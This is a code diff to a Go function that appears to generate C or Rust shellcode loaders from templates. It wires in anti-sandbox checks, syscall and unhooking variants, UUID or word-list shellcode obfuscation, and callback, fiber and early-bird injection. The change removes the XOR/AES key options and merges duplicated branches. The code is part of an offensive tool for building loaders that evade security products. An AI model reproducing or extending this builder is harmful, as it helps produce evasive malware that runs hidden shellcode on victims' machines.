@@ -9,7 +9,7 @@ import (
 	"strings"
 )
 
-func GenerateAndWriteTemplateToFile(options *Others.FlagOptions, EncryptShellcode string, key string, iv string, uuidString string, words string, datasetString string) string {
+func GenerateAndWriteTemplateToFile(options *Others.FlagOptions, EncryptShellcode string, uuidString string, words string, datasetString string) string {
 	var file_extension = ""
 	switch options.Language {
 	case "c":
@@ -33,160 +33,85 @@ func GenerateAndWriteTemplateToFile(options *Others.FlagOptions, EncryptShellcod
 			//判断反沙箱
 			switch options.Sandbox {
 			case true:
-				__c__syscall__aes = strings.ReplaceAll(__c__syscall__aes, "REPLACE_ANTI_SANDBOX", __c__sandbox)
-				__c__syscall__xor = strings.ReplaceAll(__c__syscall__xor, "REPLACE_ANTI_SANDBOX", __c__sandbox)
+				__c__syscall = strings.ReplaceAll(__c__syscall, "REPLACE_ANTI_SANDBOX", __c__sandbox)
 			default:
-				__c__syscall__aes = strings.ReplaceAll(__c__syscall__aes, "REPLACE_ANTI_SANDBOX", "")
-				__c__syscall__xor = strings.ReplaceAll(__c__syscall__xor, "REPLACE_ANTI_SANDBOX", "")
+				__c__syscall = strings.ReplaceAll(__c__syscall, "REPLACE_ANTI_SANDBOX", "")
 			}
 			//目标架构
 			switch options.Framework {
 			case 64:
-				__c__syscall__xor = strings.ReplaceAll(__c__syscall__xor, "REPLACE_STSYSCALL_Framework", "#include \"sys_64.h\"")
-				__c__syscall__aes = strings.ReplaceAll(__c__syscall__aes, "REPLACE_STSYSCALL_Framework", "#include \"sys_64.h\"")
+				__c__syscall = strings.ReplaceAll(__c__syscall, "REPLACE_STSYSCALL_Framework", "#include \"sys_64.h\"")
 			case 32:
-				__c__syscall__xor = strings.ReplaceAll(__c__syscall__xor, "REPLACE_STSYSCALL_Framework", "#include \"sys_32.h\"")
-				__c__syscall__aes = strings.ReplaceAll(__c__syscall__aes, "REPLACE_STSYSCALL_Framework", "#include \"sys_32.h\"")
+				__c__syscall = strings.ReplaceAll(__c__syscall, "REPLACE_STSYSCALL_Framework", "#include \"sys_32.h\"")
 			}
-			switch strings.ToLower(options.Encryption) {
-			case "xor":
-				switch strings.ToLower(options.Obfuscation) {
-				case "uuid":
-					__c__syscall__xor = strings.ReplaceAll(__c__syscall__xor, "REPLACR_OBFUSCATION", __c__uuid)
-					__c__syscall__xor = fmt.Sprintf(__c__syscall__xor, uuidString, key)
-					switch strings.ToLower(options.Loading) {
-					case "callback":
-						//生成模板
-						__c__syscall__xor = strings.ReplaceAll(__c__syscall__xor, "REPLACE_Loading_Technique", __c__syscall_callback)
-					case "fiber":
-						__c__syscall__xor = strings.ReplaceAll(__c__syscall__xor, "REPLACE_Loading_Technique", __c__syscall__fiber)
-					case "earlybird":
-						__c__syscall__xor = strings.ReplaceAll(__c__syscall__xor, "REPLACE_Loading_Technique", __c__syscall__earlyBird)
-					}
-					//写文件
-					Others.SaveTemplateToFile(dir1, __c__syscall__xor)
-				case "words":
-					__c__syscall__xor = strings.ReplaceAll(__c__syscall__xor, "REPLACR_OBFUSCATION", __c__words)
-					__c__syscall__xor = fmt.Sprintf(__c__syscall__xor, datasetString, words, key)
-					switch strings.ToLower(options.Loading) {
-					case "callback":
-						//生成模板
-						__c__syscall__xor = strings.ReplaceAll(__c__syscall__xor, "REPLACE_Loading_Technique", __c__syscall_callback)
-					case "fiber":
-						__c__syscall__xor = strings.ReplaceAll(__c__syscall__xor, "REPLACE_Loading_Technique", __c__syscall__fiber)
-					case "earlybird":
-						__c__syscall__xor = strings.ReplaceAll(__c__syscall__xor, "REPLACE_Loading_Technique", __c__syscall__earlyBird)
-					}
-					//写文件
-					Others.SaveTemplateToFile(dir1, __c__syscall__xor)
+
+			switch strings.ToLower(options.Obfuscation) {
+			case "uuid":
+				__c__syscall = strings.ReplaceAll(__c__syscall, "REPLACR_OBFUSCATION", __c__uuid)
+				__c__syscall = fmt.Sprintf(__c__syscall, uuidString)
+				switch strings.ToLower(options.Loading) {
+				case "callback":
+					//生成模板
+					__c__syscall = strings.ReplaceAll(__c__syscall, "REPLACE_Loading_Technique", __c__syscall_callback)
+				case "fiber":
+					__c__syscall = strings.ReplaceAll(__c__syscall, "REPLACE_Loading_Technique", __c__syscall__fiber)
+				case "earlybird":
+					__c__syscall = strings.ReplaceAll(__c__syscall, "REPLACE_Loading_Technique", __c__syscall__earlyBird)
 				}
-			case "aes":
-				switch strings.ToLower(options.Obfuscation) {
-				case "uuid":
-					__c__syscall__aes = strings.ReplaceAll(__c__syscall__aes, "REPLACR_OBFUSCATION", __c__uuid)
-					__c__syscall__aes = fmt.Sprintf(__c__syscall__aes, uuidString, key, iv)
-					switch strings.ToLower(options.Loading) {
-					case "callback":
-						//生成模板
-						__c__syscall__aes = strings.ReplaceAll(__c__syscall__aes, "REPLACE_Loading_Technique", __c__syscall_callback)
-					case "fiber":
-						__c__syscall__aes = strings.ReplaceAll(__c__syscall__aes, "REPLACE_Loading_Technique", __c__syscall__fiber)
-					case "earlybird":
-						__c__syscall__aes = strings.ReplaceAll(__c__syscall__aes, "REPLACE_Loading_Technique", __c__syscall__earlyBird)
-					}
-					//写文件
-					Others.SaveTemplateToFile(dir1, __c__syscall__aes)
-				case "words":
-					__c__syscall__aes = strings.ReplaceAll(__c__syscall__aes, "REPLACR_OBFUSCATION", __c__words)
-					__c__syscall__aes = fmt.Sprintf(__c__syscall__aes, datasetString, words, key, iv)
-					switch strings.ToLower(options.Loading) {
-					case "callback":
-						//生成模板
-						__c__syscall__aes = strings.ReplaceAll(__c__syscall__aes, "REPLACE_Loading_Technique", __c__syscall_callback)
-					case "fiber":
-						__c__syscall__aes = strings.ReplaceAll(__c__syscall__aes, "REPLACE_Loading_Technique", __c__syscall__fiber)
-					case "earlybird":
-						__c__syscall__aes = strings.ReplaceAll(__c__syscall__aes, "REPLACE_Loading_Technique", __c__syscall__earlyBird)
-					}
-					//写文件
-					Others.SaveTemplateToFile(dir1, __c__syscall__aes)
+				//写文件
+				Others.SaveTemplateToFile(dir1, __c__syscall)
+			case "words":
+				__c__syscall = strings.ReplaceAll(__c__syscall, "REPLACR_OBFUSCATION", __c__words)
+				__c__syscall = fmt.Sprintf(__c__syscall, datasetString, words)
+				switch strings.ToLower(options.Loading) {
+				case "callback":
+					//生成模板
+					__c__syscall = strings.ReplaceAll(__c__syscall, "REPLACE_Loading_Technique", __c__syscall_callback)
+				case "fiber":
+					__c__syscall = strings.ReplaceAll(__c__syscall, "REPLACE_Loading_Technique", __c__syscall__fiber)
+				case "earlybird":
+					__c__syscall = strings.ReplaceAll(__c__syscall, "REPLACE_Loading_Technique", __c__syscall__earlyBird)
 				}
+				//写文件
+				Others.SaveTemplateToFile(dir1, __c__syscall)
 			}
 		case true:
 			switch options.Sandbox {
 			case true:
-				__c__syscall__xor = strings.ReplaceAll(__c__syscall__xor, "REPLACE_ANTI_SANDBOX", __c__sandbox)
-				__c__syscall__aes = strings.ReplaceAll(__c__syscall__aes, "REPLACE_ANTI_SANDBOX", __c__sandbox)
+				__c__unhook = strings.ReplaceAll(__c__unhook, "REPLACE_ANTI_SANDBOX", __c__sandbox)
 			default:
-				__c__syscall__xor = strings.ReplaceAll(__c__syscall__xor, "REPLACE_ANTI_SANDBOX", "")
-				__c__syscall__aes = strings.ReplaceAll(__c__syscall__aes, "REPLACE_ANTI_SANDBOX", "")
+				__c__unhook = strings.ReplaceAll(__c__unhook, "REPLACE_ANTI_SANDBOX", "")
 			}
-			switch strings.ToLower(options.Encryption) {
-			case "xor":
-				switch strings.ToLower(options.Obfuscation) {
-				case "uuid":
-					__c__unhook__xor = strings.ReplaceAll(__c__unhook__xor, "REPLACR_OBFUSCATION", __c__uuid)
-					__c__unhook__xor = fmt.Sprintf(__c__unhook__xor, uuidString, key)
-					switch strings.ToLower(options.Loading) {
-					case "callback":
-						//生成模板
-						__c__unhook__xor = strings.ReplaceAll(__c__unhook__xor, "REPLACE_Loading_Technique", __c__unhook_callback)
-					case "fiber":
-						__c__unhook__xor = strings.ReplaceAll(__c__unhook__xor, "REPLACE_Loading_Technique", __c__unhook__fiber)
-					case "earlybird":
-						__c__unhook__xor = strings.ReplaceAll(__c__unhook__xor, "REPLACE_Loading_Technique", __c__unhook__earlyBird)
-					}
-					//写文件
-					Others.SaveTemplateToFile(dir1, __c__unhook__xor)
-				case "words":
-					__c__unhook__xor = strings.ReplaceAll(__c__unhook__xor, "REPLACR_OBFUSCATION", __c__words)
-					__c__unhook__xor = fmt.Sprintf(__c__unhook__xor, datasetString, words, key)
-					switch strings.ToLower(options.Loading) {
-					case "callback":
-						//生成模板
-						__c__unhook__xor = strings.ReplaceAll(__c__unhook__xor, "REPLACE_Loading_Technique", __c__unhook_callback)
-					case "fiber":
-						__c__unhook__xor = strings.ReplaceAll(__c__unhook__xor, "REPLACE_Loading_Technique", __c__unhook__fiber)
-					case "earlybird":
-						__c__unhook__xor = strings.ReplaceAll(__c__unhook__xor, "REPLACE_Loading_Technique", __c__unhook__earlyBird)
-					}
-					//写文件
-					Others.SaveTemplateToFile(dir1, __c__unhook__xor)
+			switch strings.ToLower(options.Obfuscation) {
+			case "uuid":
+				__c__unhook = strings.ReplaceAll(__c__unhook, "REPLACR_OBFUSCATION", __c__uuid)
+				__c__unhook = fmt.Sprintf(__c__unhook, uuidString)
+				switch strings.ToLower(options.Loading) {
+				case "callback":
+					//生成模板
+					__c__unhook = strings.ReplaceAll(__c__unhook, "REPLACE_Loading_Technique", __c__unhook_callback)
+				case "fiber":
+					__c__unhook = strings.ReplaceAll(__c__unhook, "REPLACE_Loading_Technique", __c__unhook__fiber)
+				case "earlybird":
+					__c__unhook = strings.ReplaceAll(__c__unhook, "REPLACE_Loading_Technique", __c__unhook__earlyBird)
 				}
-			case "aes":
-				switch strings.ToLower(options.Obfuscation) {
-				case "uuid":
-					__c__unhook__aes = strings.ReplaceAll(__c__unhook__aes, "REPLACR_OBFUSCATION", __c__uuid)
-					__c__unhook__aes = fmt.Sprintf(__c__unhook__aes, uuidString, key, iv)
-					switch strings.ToLower(options.Loading) {
-					case "callback":
-						//生成模板
-						__c__unhook__aes = strings.ReplaceAll(__c__unhook__aes, "REPLACE_Loading_Technique", __c__unhook_callback)
-					case "fiber":
-						__c__unhook__aes = strings.ReplaceAll(__c__unhook__aes, "REPLACE_Loading_Technique", __c__unhook__fiber)
-					case "earlybird":
-						__c__unhook__aes = strings.ReplaceAll(__c__unhook__aes, "REPLACE_Loading_Technique", __c__unhook__earlyBird)
-					}
-					//写文件
-					Others.SaveTemplateToFile(dir1, __c__unhook__aes)
-				case "words":
-					__c__unhook__aes = strings.ReplaceAll(__c__unhook__aes, "REPLACR_OBFUSCATION", __c__words)
-					__c__unhook__aes = fmt.Sprintf(__c__unhook__aes, datasetString, words, key, iv)
-					switch strings.ToLower(options.Loading) {
-					case "callback":
-						//生成模板
-						__c__unhook__aes = strings.ReplaceAll(__c__unhook__aes, "REPLACE_Loading_Technique", __c__unhook_callback)
-					case "fiber":
-						__c__unhook__aes = strings.ReplaceAll(__c__unhook__aes, "REPLACE_Loading_Technique", __c__unhook__fiber)
-					case "earlybird":
-						__c__unhook__aes = strings.ReplaceAll(__c__unhook__aes, "REPLACE_Loading_Technique", __c__unhook__earlyBird)
-					}
-					//写文件
-					Others.SaveTemplateToFile(dir1, __c__unhook__aes)
+				//写文件
+				Others.SaveTemplateToFile(dir1, __c__unhook)
+			case "words":
+				__c__unhook = strings.ReplaceAll(__c__unhook, "REPLACR_OBFUSCATION", __c__words)
+				__c__unhook = fmt.Sprintf(__c__unhook, datasetString, words)
+				switch strings.ToLower(options.Loading) {
+				case "callback":
+					//生成模板
+					__c__unhook = strings.ReplaceAll(__c__unhook, "REPLACE_Loading_Technique", __c__unhook_callback)
+				case "fiber":
+					__c__unhook = strings.ReplaceAll(__c__unhook, "REPLACE_Loading_Technique", __c__unhook__fiber)
+				case "earlybird":
+					__c__unhook = strings.ReplaceAll(__c__unhook, "REPLACE_Loading_Technique", __c__unhook__earlyBird)
 				}
-
+				//写文件
+				Others.SaveTemplateToFile(dir1, __c__unhook)
 			}
-
 		}
 	case "rust":
 		dir, _ := os.Getwd()
@@ -200,70 +125,37 @@ func GenerateAndWriteTemplateToFile(options *Others.FlagOptions, EncryptShellcod
 			default:
 				__rust__unhook = strings.ReplaceAll(__rust__unhook, "REPLACE_ANTI_SANDBOX", "")
 			}
-			switch strings.ToLower(options.Encryption) {
-			case "xor":
-				__rust__unhook = strings.ReplaceAll(__rust__unhook, "REPLACR_DECRYPT", __rust__xor)
-				switch strings.ToLower(options.Obfuscation) {
-				case "uuid":
-					__rust__unhook = strings.ReplaceAll(__rust__unhook, "REPLACR_OBFUSCATION", __rust__uuid)
-					__rust__unhook = fmt.Sprintf(__rust__unhook, uuidString, key)
-					switch strings.ToLower(options.Loading) {
-					case "callback":
-						__rust__unhook = strings.ReplaceAll(__rust__unhook, "REPLACE_Loading_Technique", __rust__unhook__callback)
-					case "fiber":
-						__rust__unhook = strings.ReplaceAll(__rust__unhook, "REPLACE_Loading_Technique", __rust__unhook__fiber)
-					case "earlybird":
-						__rust__unhook = strings.ReplaceAll(__rust__unhook, "REPLACE_Loading_Technique", __rust__unhook__earlybird)
-					}
-					Others.SaveTemplateToFile(dir1, __rust__unhook)
-				case "words":
-					__rust__unhook = strings.ReplaceAll(__rust__unhook, "REPLACR_OBFUSCATION", __rust__words)
-					__rust__unhook = fmt.Sprintf(__rust__unhook, datasetString, words, key)
-					switch strings.ToLower(options.Loading) {
-					case "callback":
-						__rust__unhook = strings.ReplaceAll(__rust__unhook, "REPLACE_Loading_Technique", __rust__unhook__callback)
-					case "fiber":
-						__rust__unhook = strings.ReplaceAll(__rust__unhook, "REPLACE_Loading_Technique", __rust__unhook__fiber)
-					case "earlybird":
-						__rust__unhook = strings.ReplaceAll(__rust__unhook, "REPLACE_Loading_Technique", __rust__unhook__earlybird)
-					}
-					Others.SaveTemplateToFile(dir1, __rust__unhook)
+			switch strings.ToLower(options.Obfuscation) {
+			case "uuid":
+				__rust__unhook = strings.ReplaceAll(__rust__unhook, "REPLACR_OBFUSCATION", __rust__uuid)
+				__rust__unhook = fmt.Sprintf(__rust__unhook, uuidString, datasetString, words)
+				switch strings.ToLower(options.Loading) {
+				case "callback":
+					__rust__unhook = strings.ReplaceAll(__rust__unhook, "REPLACE_Loading_Technique", __rust__unhook__callback)
+				case "fiber":
+					__rust__unhook = strings.ReplaceAll(__rust__unhook, "REPLACE_Loading_Technique", __rust__unhook__fiber)
+				case "earlybird":
+					__rust__unhook = strings.ReplaceAll(__rust__unhook, "REPLACE_Loading_Technique", __rust__unhook__earlybird)
 				}
-			case "aes":
-				__rust__unhook = strings.ReplaceAll(__rust__unhook, "REPLACR_DECRYPT", __rust__aes)
-				switch strings.ToLower(options.Obfuscation) {
-				case "uuid":
-					__rust__unhook = strings.ReplaceAll(__rust__unhook, "REPLACR_OBFUSCATION", __rust__uuid)
-					__rust__unhook = fmt.Sprintf(__rust__unhook, uuidString, key, iv)
-					switch strings.ToLower(options.Loading) {
-					case "callback":
-						__rust__unhook = strings.ReplaceAll(__rust__unhook, "REPLACE_Loading_Technique", __rust__unhook__callback)
-					case "fiber":
-						__rust__unhook = strings.ReplaceAll(__rust__unhook, "REPLACE_Loading_Technique", __rust__unhook__fiber)
-					case "earlybird":
-						__rust__unhook = strings.ReplaceAll(__rust__unhook, "REPLACE_Loading_Technique", __rust__unhook__earlybird)
-					}
-
-					Others.SaveTemplateToFile(dir1, __rust__unhook)
-				case "words":
-					__rust__unhook = strings.ReplaceAll(__rust__unhook, "REPLACR_OBFUSCATION", __rust__words)
-					__rust__unhook = fmt.Sprintf(__rust__unhook, datasetString, words, key, iv)
-					switch strings.ToLower(options.Loading) {
-					case "callback":
-						__rust__unhook = strings.ReplaceAll(__rust__unhook, "REPLACE_Loading_Technique", __rust__unhook__callback)
-					case "fiber":
-						__rust__unhook = strings.ReplaceAll(__rust__unhook, "REPLACE_Loading_Technique", __rust__unhook__fiber)
-					case "earlybird":
-						__rust__unhook = strings.ReplaceAll(__rust__unhook, "REPLACE_Loading_Technique", __rust__unhook__earlybird)
-					}
-					Others.SaveTemplateToFile(dir1, __rust__unhook)
+				Others.SaveTemplateToFile(dir1, __rust__unhook)
+			case "words":
+				__rust__unhook = strings.ReplaceAll(__rust__unhook, "REPLACR_OBFUSCATION", __rust__words)
+				__rust__unhook = fmt.Sprintf(__rust__unhook, datasetString, words)
+				switch strings.ToLower(options.Loading) {
+				case "callback":
+					__rust__unhook = strings.ReplaceAll(__rust__unhook, "REPLACE_Loading_Technique", __rust__unhook__callback)
+				case "fiber":
+					__rust__unhook = strings.ReplaceAll(__rust__unhook, "REPLACE_Loading_Technique", __rust__unhook__fiber)
+				case "earlybird":
+					__rust__unhook = strings.ReplaceAll(__rust__unhook, "REPLACE_Loading_Technique", __rust__unhook__earlybird)
 				}
+				Others.SaveTemplateToFile(dir1, __rust__unhook)
 			}
+
 		case false:
 			fmt.Println("暂不支持此种加载方式")
 			os.Exit(-1)
 		}
-
 	}
 	return outfile
 }
